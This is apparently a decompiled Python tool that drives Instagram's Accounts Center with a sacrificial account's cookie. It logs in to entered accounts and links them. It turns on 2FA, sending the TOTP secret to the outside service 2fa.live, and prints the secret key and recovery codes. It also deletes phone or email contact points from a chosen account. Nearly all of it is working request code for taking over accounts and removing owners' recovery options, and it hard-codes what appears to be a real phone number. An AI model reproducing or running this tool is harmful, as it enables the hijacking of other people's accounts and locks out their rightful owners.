""" Decompiled by Exotic Hridoy """

import requests
import re
import time
import uuid
import os
import json
import string
import random
import sys
import hashlib
from bs4 import BeautifulSoup as parser
from datetime import date, datetime

D = '[91m'
W = '[37m'

class login:
    def __init__(self, cookie_tumbal):
        self.cookie = {'cookie': cookie_tumbal}
        self.client = str(uuid.uuid4())

    def main1(self, username, password):
        try:
            self.headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'id',
                'cache-control': 'max-age=0',
                'dpr': '1',
                'priority': 'u=0, i',
                'referer': 'https://www.instagram.com/',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.112", "Chromium";v="131.0.6778.205", "Not_A Brand";v="24.0.0.0"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '"15.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
                'viewport-width': '673',
                'cookie': self.cookie['cookie']
            }
            
            self.response = requests.get('https://accountscenter.instagram.com/accounts/?theme=dark', headers=self.headers).text
            self.url_match = re.findall('"multi_web_auth":\[\{"config":\{"url":"(.*?)"', self.response)
            
            if self.url_match:
                self.url = self.url_match[0]
                self.url1 = self.url.replace('\\', '')
                
                try:
                    self.csrf = re.findall('csrftoken=(.*?);', str(self.cookie['cookie']))[0]
                except:
                    self.csrf = ''
                
                try:
                    self.etoken = re.findall('etoken=(.*?)&', self.url1)[0]
                except:
                    self.etoken = ''
                
                try:
                    self.hmac = re.search('"claim":"(.*?)"', self.response).group(1)
                except:
                    self.hmac = ''
                
                self.headers1 = {
                    'accept': '*/*',
                    'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
                    'content-type': 'application/x-www-form-urlencoded',
                    'cookie': self.cookie['cookie'],
                    'origin': 'https://www.instagram.com',
                    'priority': 'u=1, i',
                    'referer': self.url1,
                    'sec-ch-prefers-color-scheme': 'dark',
                    'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                    'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.112", "Chromium";v="131.0.6778.205", "Not_A Brand";v="24.0.0.0"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-model': '""',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-ch-ua-platform-version': '"15.0.0"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
                    'x-asbd-id': '129477',
                    'x-csrftoken': self.csrf,
                    'x-ig-app-id': '936619743392459',
                    'x-ig-www-claim': self.hmac,
                    'x-instagram-ajax': 'XMLHttpRequest',
                    'x-requested-with': 'XMLHttpRequest'
                }
                
                self.data3 = {
                    'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
                    'etoken': self.etoken,
                    'username': username
                }
                
                self.resp1 = requests.post('https://www.instagram.com/api/v1/web/fxcal/auth/login/ajax/', data=self.data3, headers=self.headers1)
                
                if 'authenticated":true' in self.resp1.text:
                    print(f"[+] Login to {self.data3['username']} successful")
                    
                    self.headers2 = {
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                        'accept-language': 'id',
                        'cookie': self.cookie['cookie'],
                        'dpr': '1',
                        'priority': 'u=0, i',
                        'referer': 'https://www.instagram.com/',
                        'sec-ch-prefers-color-scheme': 'dark',
                        'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                        'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.112", "Chromium";v="131.0.6778.205", "Not_A Brand";v="24.0.0.0"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-model': '""',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-ch-ua-platform-version': '"15.0.0"',
                        'sec-fetch-dest': 'document',
                        'sec-fetch-mode': 'navigate',
                        'sec-fetch-site': 'same-site',
                        'sec-fetch-user': '?1',
                        'upgrade-insecure-requests': '1',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
                        'viewport-width': '673'
                    }
                    
                    self.params = {
                        'auth_flow': 'ig_linking',
                        'background_page': '/',
                        'blob': self.resp1.json()['blob'],
                        'token': self.resp1.json()['token']
                    }
                    
                    self.resp2 = requests.get('https://accountscenter.instagram.com/add/', params=self.params, headers=self.headers2)
                    
                    self.ttlinfo = re.findall('"source_age_info":\{"age":(\d+),"opaque_account_id":"(.*?)"', self.resp2.text)
                    if len(self.ttlinfo) == 0:
                        self.ttlinfo = [('null', 'null')]
                    
                    self.tttl, self.opaquettl = self.ttlinfo[0]
                    
                    try:
                        self.flsd = re.search('"LSD",\[\],\{"token":"(.*?)"', self.resp2.text).group(1)
                        self.aktorid = re.search('"actorID":"(\d+)"', self.resp2.text).group(1)
                        self.hsi = re.search('"hsi":"(\d+)"', self.resp2.text).group(1)
                        self.hastesession = re.search('"haste_session":"(.*?)"', self.resp2.text).group(1)
                        self.rev = re.search('\{"rev":(\d+)\}', self.resp2.text).group(1)
                        self.spinr = re.search('"__spin_r":(\d+)', self.resp2.text).group(1)
                        self.spint = re.search('"__spin_t":(\d+)', self.resp2.text).group(1)
                        self.dtsg = re.search('"DTSGInitialData",\[\],\{"token":"(.*?)"', self.resp2.text).group(1)
                        self.jazo = re.search('jazoest=(\d+)', self.resp2.text).group(1)
                        self.sensitiveurl = re.search('\{"sensitive_string_value":"(.*?)"\}', self.resp2.text).group(1)
                    except Exception as e:
                        print(f"[!] Error extracting tokens: {e}")
                        return
                    
                    self.headers3 = {
                        'accept': '*/*',
                        'accept-language': 'id',
                        'content-type': 'application/x-www-form-urlencoded',
                        'cookie': self.cookie['cookie'],
                        'origin': 'https://accountscenter.instagram.com',
                        'priority': 'u=1, i',
                        'referer': self.resp2.url,
                        'sec-ch-prefers-color-scheme': 'dark',
                        'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                        'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.112", "Chromium";v="131.0.6778.205", "Not_A Brand";v="24.0.0.0"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-model': '""',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-ch-ua-platform-version': '"15.0.0"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
                        'x-asbd-id': '129477',
                        'x-fb-friendly-name': 'FXLinkingFlowDisclosuresRefetchQuery',
                        'x-fb-lsd': self.flsd
                    }
                    
                    self.data4 = {
                        'av': self.aktorid,
                        '__user': '0',
                        '__a': '1',
                        '__req': 'i',
                        '__hs': self.hastesession,
                        'dpr': '1',
                        '__ccg': 'GOOD',
                        '__rev': self.rev,
                        '__s': 'liwoo5:rxplen:w0epet',
                        '__hsi': self.hsi,
                        '__dyn': '7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo19oe8hw2nVE4W099w8G1Dz81s8hwnU2lwv89k2C1Fwc60D82IzXwae4UaEW0Loco5G0zK1swa-0nK3qazo7u0zEiwaG1LwTwNw4mwr86C1nw4xxW1owLwHwGwbu',
                        '__csr': 'gz6hBMP5ulkLA4thavAaBmSKiFDr4lQDt9LSAyFb_C9aVdbFtamzaGmt35ybKQGFdKCtbrmpBCCKFuVqbHbRSgytqgSGWAF9p4QbV-qmEWitKWmmiV4iJryFJbXGQbQ8niAHBzudyHQ5vAKl4hd3USuUkABCqyXh4iexi00k3WHwOg1to1vKFbGFfAxmGHwPKXCBK0Zo1zh7Bk8wEGhw15-URaEnjjg0OFaGGaGitdalauGwbiE0AO0lAx4bghJ399e1mIK2qt2FEbo332yCIS4IE94Ex7Gp1qq260nGAU4q4ohyE2ugK0rm9qvEs68J4wBga89VFrAAykVEIUyjKqZunK5omLEHwFCKE4uawa5ouxe8www19F6Dw',
                        '__comet_req': '24',
                        'fb_dtsg': self.dtsg,
                        'jazoest': self.jazo,
                        'lsd': self.flsd,
                        '__spin_r': self.spinr,
                        '__spin_b': self.spint,
                        '__spin_t': self.spint,
                        'fb_api_caller_class': 'RelayModern',
                        'fb_api_req_friendly_name': 'FXLinkingFlowDisclosuresRefetchQuery',
                        'variables': json.dumps({
                            "device_id": "device_id_fetch_ig_did",
                            "flow": "IG_WEB_SETTINGS",
                            "selected_age": self.tttl,
                            "used_native_auth_in_vr": False,
                            "web_auth": {
                                "account_type": "INSTAGRAM",
                                "completion_url": {
                                    "sensitive_string_value": self.sensitiveurl.replace('\\', '')
                                },
                                "web_auth_plain_token": {
                                    "sensitive_string_value": "USER_TOKEN"
                                }
                            }
                        }),
                        'server_timestamps': 'true',
                        'doc_id': '8717731548311624'
                    }
                    
                    self.resp3 = requests.post('https://accountscenter.instagram.com/api/graphql/', data=self.data4, headers=self.headers3).text
                    
                    try:
                        self.opaque_target = re.search('"opaque_target_account_string":"(.*?)"', self.resp2.text).group(1)
                    except:
                        self.opaque_target = 'null'
                    
                    self.data4.update({
                        'fb_api_req_friendly_name': 'useFXLinkMutation',
                        'variables': json.dumps({
                            "client_mutation_id": self.client,
                            "flow": "IG_WEB_SETTINGS",
                            "target_account_id": None,
                            "target_account_type": "INSTAGRAM",
                            "target_auth_proof_string": {"sensitive_string_value": ""},
                            "device_id": "device_id_fetch_ig_did",
                            "interface": "IG_WEB",
                            "platform": "INSTAGRAM",
                            "scale": 1,
                            "selected_age_account_id": None,
                            "selected_age_account_type": "INSTAGRAM",
                            "opaque_target_account_string": {"sensitive_string_value": self.opaque_target},
                            "selected_opaque_age_account_id": {"sensitive_string_value": self.opaquettl},
                            "show_age_updated_dialog": False,
                            "used_native_auth_in_vr": False,
                            "entrypoint": None,
                            "reconciled_birthday": None,
                            "reconciled_2fa_phone_number": None,
                            "selected_supervision_account_id": None
                        }),
                        'doc_id': '8717731548311624'
                    })
                    
                    self.headers3.update({'x-fb-friendly-name': 'useFXLinkMutation'})
                    self.resp4 = requests.post('https://accountscenter.instagram.com/api/graphql/', data=self.data4, headers=self.headers3).text
                    
                    if 'is_success":true' in self.resp4:
                        print(f'[+] Account {username} successfully added')
                    else:
                        if 'Anda bisa mencoba lagi nanti atau menggunakan akun lain.' in self.resp4:
                            print('[!] Tumbal account is limited, use a fresh one')
                        else:
                            print('[+] You can try using another account')
                else:
                    if 'checkpoint_required' in self.resp1.text:
                        print('\n[!] Login checkpoint required')
                    else:
                        print(f'\n[!] Login to {username} failed, check notification or try changing password')
            else:
                print('\n[!] Login URL not available, check tumbal cookie')
        except Exception as e:
            print(f'[!] Error: {e}')

    def aktifkan2fa(self, data):
        try:
            self.headers5 = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'id',
                'cache-control': 'max-age=0',
                'cookie': self.cookie['cookie'],
                'dpr': '1',
                'priority': 'u=0, i',
                'referer': 'https://www.instagram.com/',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.112", "Chromium";v="131.0.6778.205", "Not_A Brand";v="24.0.0.0"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '"15.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
                'viewport-width': '673'
            }
            
            self.resp5 = requests.get('https://accountscenter.instagram.com/password_and_security/two_factor/', headers=self.headers5).text
            self.akunList = re.findall('\{"__typename":"XFBFXIGAccountInfo","id":"(\\d+)","display_name":"(.*?)","platform_info":\{"type":"INSTAGRAM","name":"Instagram"\}', self.resp5)
            
            print(f'\n[+] Found {len(self.akunList)} Instagram accounts\n')
            self.loop = 0
            for idakun, namaakun in self.akunList:
                self.loop += 1
                print(f'[{self.loop}]. {idakun}|{namaakun}')
            
            self.idakun = input('\n[?] Enter account ID to activate 2FA: ')
            
            data.update({
                'fb_api_req_friendly_name': 'useFXSettingsTwoFactorGenerateTOTPKeyMutation',
                'variables': json.dumps({
                    "input": {
                        "client_mutation_id": self.client,
                        "actor_id": data['av'],
                        "account_id": self.idakun,
                        "account_type": "INSTAGRAM",
                        "device_id": "device_id_fetch_ig_did",
                        "fdid": "device_id_fetch_ig_did"
                    }
                }),
                'doc_id': '6282672078501565'
            })
            
            self.headers5.update({'x-fb-friendly-name': 'useFXSettingsTwoFactorGenerateTOTPKeyMutation'})
            self.resp6 = requests.post('https://accountscenter.instagram.com/api/graphql/', headers=self.headers5, data=data)
            
            if 'FXCALSettingsMutationErrorRequiresReauth' in self.resp6.text:
                exit('\n[!] Remove this account from tumbal and add again')
            
            self.keys2 = re.search('"key_text":"(.*?)"', self.resp6.text).group(1)
            
            self.headers_2f = {
                'accept': '*/*',
                'accept-language': 'id',
                'cookie': '_gcl_au=1.1.1496091412.1736620780; _ga=GA1.1.857719576.1736620782; _ga_R2SB88WPTD=GS1.1.1736620781.1.1.1736620796.0.0.0',
                'priority': 'u=1, i',
                'referer': 'https://2fa.live/',
                'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
                'x-requested-with': 'XMLHttpRequest'
            }
            
            self.token_2fa = requests.get(f"https://2fa.live/tok/{self.keys2.replace(' ', '')}").json()['token']
            
            data.update({
                'fb_api_req_friendly_name': 'useFXSettingsTwoFactorEnableTOTPMutation',
                'variables': json.dumps({
                    "input": {
                        "client_mutation_id": self.client,
                        "actor_id": data['av'],
                        "account_id": self.idakun,
                        "account_type": "INSTAGRAM",
                        "verification_code": self.token_2fa,
                        "device_id": "device_id_fetch_ig_did",
                        "fdid": "device_id_fetch_ig_did"
                    }
                }),
                'doc_id': '7032881846733167'
            })
            
            self.headers5.update({'x-fb-friendly-name': 'useFXSettingsTwoFactorEnableTOTPMutation'})
            self.resp7 = requests.post('https://accountscenter.instagram.com/api/graphql/', headers=self.headers5, data=data).text
            
            if 'success":true' in self.resp7:
                print(f'\n[+] 2FA activated successfully for Instagram\n[+] Secret Key: {self.keys2}\n')
                
                data.update({
                    'qpl_active_flow_ids': '433922143',
                    'fb_api_caller_class': 'RelayModern',
                    'fb_api_req_friendly_name': 'useFXSettingsTwoFactorFetchRecoveryCodesMutation',
                    'variables': json.dumps({
                        "input": {
                            "client_mutation_id": self.client,
                            "actor_id": data['av'],
                            "account_id": self.idakun,
                            "account_type": "INSTAGRAM",
                            "fdid": "device_id_fetch_ig_did"
                        }
                    }),
                    'doc_id': '24140213678960162',
                    'fb_api_analytics_tags': '["qpl_active_flow_ids=433922143"]'
                })
                
                self.headers5.update({'x-fb-friendly-name': 'useFXSettingsTwoFactorFetchRecoveryCodesMutation'})
                self.resp8 = requests.post('https://accountscenter.instagram.com/api/graphql/', headers=self.headers5, data=data).text
                
                try:
                    self.kode_pemulihan = re.findall('"recovery_codes":(.*?)\}', self.resp8)
                    for self.dihi in json.loads(self.kode_pemulihan[0]):
                        print(self.dihi)
                except Exception as e:
                    print('\n[!] Error getting recovery codes')
            else:
                print('\n[!] Failed to activate 2FA')
                
        except Exception as e:
            print(f'\n[!] Error: {e}')
            exit()

    def GetContactPoint(self):
        try:
            self.headers6 = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
                'cache-control': 'max-age=0',
                'cookie': self.cookie['cookie'],
                'dpr': '1',
                'priority': 'u=0, i',
                'referer': 'https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=phone_number&contact_point_value=%2B6285366936081&dialog_type=contact_detail',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.112", "Chromium";v="131.0.6778.205", "Not_A Brand";v="24.0.0.0"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '"15.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
                'viewport-width': '673'
            }
            
            self.resp2 = requests.get('https://accountscenter.instagram.com/personal_info/contact_points/', headers=self.headers6)
            
            print('\n[+] List of account center\n')
            self.info = re.findall('"identities_and_central_identities":\{"linked_identities_to_pci":\[(.*?)\]\}', self.resp2.text)
            
            for self.asuu in self.info:
                self.usersid = re.findall('"canonical_id":"(\\d+)"', self.asuu)
                self.profile = re.findall('"full_name":"(.*?)","username":"(.*?)"', self.asuu)
            
            for self.pro in range(len(self.usersid)):
                self.profileinfo = self.usersid[self.pro] + '|' + self.profile[self.pro][1]
                print(f'[+] {self.profileinfo}')
            
            self.contactList = re.findall('"normalized_contact_point":"(.*?)"', self.resp2.text)
            self.loop1 = 0
            print('')
            
            for self.kham in self.contactList:
                self.loop1 += 1
                kham_fixed = self.kham.replace("\\u0040", "@")
                print(f"[{self.loop1}] {kham_fixed}")
            
            self.remove_kontak = input('\n[?] Enter phone/email (don\'t remove +62 if phone): ')
            
            self.flsd = re.search('"LSD",\[\],\{"token":"(.*?)"', self.resp2.text).group(1)
            self.aktorid = re.search('"actorID":"(\\d+)"', self.resp2.text).group(1)
            self.hastesession = re.search('"haste_session":"(.*?)"', self.resp2.text).group(1)
            self.rev = re.search('\{"rev":(\d+)\}', self.resp2.text).group(1)
            self.spinr = re.search('"__spin_r":(\d+)', self.resp2.text).group(1)
            self.spint = re.search('"__spin_t":(\d+)', self.resp2.text).group(1)
            self.dtsg = re.search('"DTSGInitialData",\[\],\{"token":"(.*?)"', self.resp2.text).group(1)
            self.jazo = re.search('jazoest=(\d+)', self.resp2.text).group(1)
            
            self.targetid = input('[?] Enter account ID to remove data from: ')
            
            self.data5 = {
                'av': self.aktorid,
                '__user': '0',
                '__a': '1',
                '__req': 'i',
                '__hs': self.hastesession,
                'dpr': '1',
                '__ccg': 'GOOD',
                '__rev': self.rev,
                '__s': 'liwoo5:rxplen:w0epet',
                '__hsi': 'hsi',
                '__dyn': '7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo19oe8hw2nVE4W099w8G1Dz81s8hwnU2lwv89k2C1Fwc60D82IzXwae4UaEW0Loco5G0zK1swa-0nK3qazo7u0zEiwaG1LwTwNw4mwr86C1nw4xxW1owLwHwGwbu',
                '__csr': 'gz6hBMP5ulkLA4thavAaBmSKiFDr4lQDt9LSAyFb_C9aVdbFtamzaGmt35ybKQGFdKCtbrmpBCCKFuVqbHbRSgytqgSGWAF9p4QbV-qmEWitKWmmiV4iJryFJbXGQbQ8niAHBzudyHQ5vAKl4hd3USuUkABCqyXh4iexi00k3WHwOg1to1vKFbGFfAxmGHwPKXCBK0Zo1zh7Bk8wEGhw15-URaEnjjg0OFaGGaGitdalauGwbiE0AO0lAx4bghJ399e1mIK2qt2FEbo332yCIS4IE94Ex7Gp1qq260nGAU4q4ohyE2ugK0rm9qvEs68J4wBga89VFrAAykVEIUyjKqZunK5omLEHwFCKE4uawa5ouxe8www19F6Dw',
                '__comet_req': '24',
                'fb_dtsg': self.dtsg,
                'jazoest': self.jazo,
                'lsd': self.flsd,
                '__spin_r': self.spinr,
                '__spin_b': self.spint,
                '__spin_t': self.spint,
                'fb_api_caller_class': 'RelayModern',
                'fb_api_req_friendly_name': 'FXAccountsCenterDeleteContactPointMutation',
                'variables': json.dumps({
                    "normalized_contact_point": self.remove_kontak,
                    "contact_point_type": "PHONE_NUMBER",
                    "selected_accounts": [self.targetid]
                }),
                'server_timestamps': 'true',
                'doc_id': '5788102017946779'
            }
            
            self.headers7 = {
                'accept': '*/*',
                'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': self.cookie['cookie'],
                'origin': 'https://accountscenter.instagram.com',
                'priority': 'u=1, i',
                'referer': 'https://accountscenter.instagram.com/personal_info/contact_points/',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.112", "Chromium";v="131.0.6778.205", "Not_A Brand";v="24.0.0.0"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '"15.0.0"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
                'x-asbd-id': '129477',
                'x-fb-friendly-name': 'FXAccountsCenterDeleteContactPointMutation',
                'x-fb-lsd': self.flsd
            }
            
            self.resp9 = requests.post('https://accountscenter.instagram.com/api/graphql/', data=self.data5, headers=self.headers7).text
            
            if 'reauth_accounts' in self.resp9:
                self.type = 'email' if '@' in self.remove_kontak else 'phone_number'
                print('\n[!] Re-authentication required, enter account data for 2FA')
                username = input('[?] Username: ')
                password = input('[?] Password: ')
                
                self.profile = re.search('"profile_identifier":"(.*?)"', self.resp9).group(1)
                
                self.headers7.update({'x-fb-friendly-name': 'FXReauthDialogPageQuery'})
                self.data5.update({
                    'fb_api_req_friendly_name': 'FXReauthDialogPageQuery',
                    'variables': json.dumps({
                        "account_type": "INSTAGRAM",
                        "device_id": "device_id_fetch_ig_did",
                        "extra_data": f"/personal_info/contact_points/?contact_point_type={self.type}&contact_point_value={self.remove_kontak}&dialog_type=contact_detail",
                        "force_logout": False,
                        "node_id": "CONTACT_POINT",
                        "reauth_initiator_flow": "SETTINGS",
                        "target_userid": self.profile,
                        "use_fxcal_reauth_cadam": True,
                        "include_reauth": True,
                        "single_reauth": True,
                        "interface": "IG_WEB"
                    }),
                    'doc_id': '8882706878428466'
                })
                
                self.resp10 = requests.post('https://accountscenter.instagram.com/api/graphql/', data=self.data5, headers=self.headers7).text
                self.curlfc = re.search('"web_auth":\{"url":"(.*?)"', self.resp10).group(1)
                
                try:
                    self.csrf = re.findall('csrftoken=(.*?);', str(self.cookie['cookie']))[0]
                except:
                    self.csrf = ''
                
                try:
                    self.etoken = re.findall('etoken=(.*?)&', self.curlfc)[0]
                except:
                    self.etoken = ''
                
                self.headers8 = {
                    'accept': '*/*',
                    'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
                    'content-type': 'application/x-www-form-urlencoded',
                    'cookie': self.cookie['cookie'],
                    'origin': 'https://www.instagram.com',
                    'priority': 'u=1, i',
                    'referer': self.curlfc,
                    'sec-ch-prefers-color-scheme': 'dark',
                    'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                    'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.112", "Chromium";v="131.0.6778.205", "Not_A Brand";v="24.0.0.0"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-model': '""',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-ch-ua-platform-version': '"15.0.0"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
                    'x-asbd-id': '129477',
                    'x-csrftoken': self.csrf,
                    'x-ig-app-id': '936619743392459',
                    'x-ig-www-claim': '1019280819',
                    'x-instagram-ajax': 'XMLHttpRequest',
                    'x-requested-with': 'XMLHttpRequest'
                }
                
                self.data6 = {
                    'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
                    'etoken': self.etoken,
                    'username': username
                }
                
                self.resp11 = requests.post('https://www.instagram.com/api/v1/web/fxcal/auth/login/ajax/', data=self.data6, headers=self.headers8)
                
                if 'authenticated":true' in self.resp11.text:
                    self.params = {
                        'contact_point_type': self.type,
                        'contact_point_value': self.remove_kontak,
                        'dialog_type': 'contact_detail',
                        'auth_flow': 'reauth',
                        'blob': self.resp11.json()['blob'],
                        'token': self.resp11.json()['token']
                    }
                    
                    self.headers9 = {
                        'accept': '*/*',
                        'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
                        'content-type': 'application/x-www-form-urlencoded',
                        'cookie': self.cookie['cookie'],
                        'origin': 'https://accountscenter.instagram.com',
                        'priority': 'u=1, i',
                        'referer': 'https://accountscenter.instagram.com/personal_info/contact_points/',
                        'sec-ch-prefers-color-scheme': 'dark',
                        'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                        'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.146", "Chromium";v="131.0.6778.265", "Not_A Brand";v="24.0.0.0"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-model': '""',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-ch-ua-platform-version': '"15.0.0"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
                        'x-asbd-id': '129477',
                        'x-fb-friendly-name': 'FXAccountsCenterContactPointMutationResultsQuery',
                        'x-fb-lsd': self.flsd
                    }
                    
                    self.data5.update({
                        'fb_api_req_friendly_name': 'FXAccountsCenterContactPointMutationResultsQuery',
                        'variables': json.dumps({
                            "contact_point_event_type": "DELETE",
                            "contact_point_type": self.type.upper(),
                            "interface": "IG_WEB",
                            "normalized_contact_point": self.remove_kontak
                        }),
                        'server_timestamps': 'true',
                        'doc_id': '5788102017946779'
                    })
                    
                    self.asuu = requests.post('https://accountscenter.instagram.com/api/graphql/', data=self.data5, headers=self.headers9).text
                    
                    if 'success":true' in self.asuu:
                        print('\n[+] Successfully removed')
                    else:
                        print('\n[!] Failed to remove')
                else:
                    print('[!] Login failed :(')
            elif '"api_error_code":200' in self.resp9:
                print('\n[!] Password required')
                self.ipas = input('[?] Enter account password to remove data: ')
                self.pasw = f'#PWD_BROWSER:0:{int(time.time())}:{self.ipas}'
                
                self.data5.update({
                    'fb_api_req_friendly_name': 'FXPasswordReauthenticationMutation',
                    'variables': json.dumps({
                        "input": {
                            "account_id": self.targetid,
                            "account_type": "INSTAGRAM",
                            "category_name": "SecuredActionDeleteMetaContactPointCategory",
                            "password": {"sensitive_string_value": self.pasw},
                            "actor_id": self.data5['av'],
                            "client_mutation_id": "1"
                        }
                    }),
                    'server_timestamps': 'true',
                    'doc_id': '5864546173675027'
                })
                
                self.headers7.update({'x-fb-friendly-name': 'FXPasswordReauthenticationMutation'})
                self.resp392 = requests.post('https://accountscenter.instagram.com/api/graphql/', data=self.data5, headers=self.headers7).text
                
                if 'success":true' in self.resp392:
                    print('\n[+] Reauthentication successful, repeat previous step\n')
                    self.GetContactPoint()
                else:
                    exit('\n[!] Reauthentication failed')
